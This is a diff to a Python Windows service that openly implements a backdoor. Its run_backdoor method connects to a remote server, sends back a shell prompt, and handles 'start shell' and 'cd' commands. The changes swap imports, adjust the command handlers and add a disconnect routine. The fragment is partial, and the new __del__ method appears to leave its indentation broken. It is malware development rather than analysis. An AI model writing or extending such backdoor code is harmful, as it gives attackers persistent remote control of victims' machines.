@@ -6,7 +6,7 @@ import sys
 import os
 import time
 import socket
-import subprocess
+import signal
 import win32comext.shell.shell as shell
 
 import win32ts
@@ -55,6 +55,7 @@ class Main(service.WinService):
 
     def run_backdoor(self):
         self.connect_to_server()
+        # self.execute_admin_cmd("chcp 65001")
 
         while True:
             try:
@@ -69,7 +70,7 @@ class Main(service.WinService):
         if command == "start shell":
             self.s.send(f"{os.getcwd()} >> ".encode("utf-8"))
         elif command == "hello":
-            self.s.send("hello")
+            pass
         elif command[:2] == "cd":
             try:
                 os.chdir(command[3:])
@@ -114,12 +115,18 @@ class Main(service.WinService):
         with open(self.commands_log_filepath) as f:
             return f.read()
 
+    def disconnect_from_server(self):
+        self.s.send(f"disconnect {self.s.getpeername()[0]}")
+
     def main(self):
         self.run_backdoor()
 
     def stop(self):
         self.is_running = False
         self.log("Service stopped")
+
+    def __del__(self):
+        # self.disconnect_from_server()
         self.s.close()
 
 
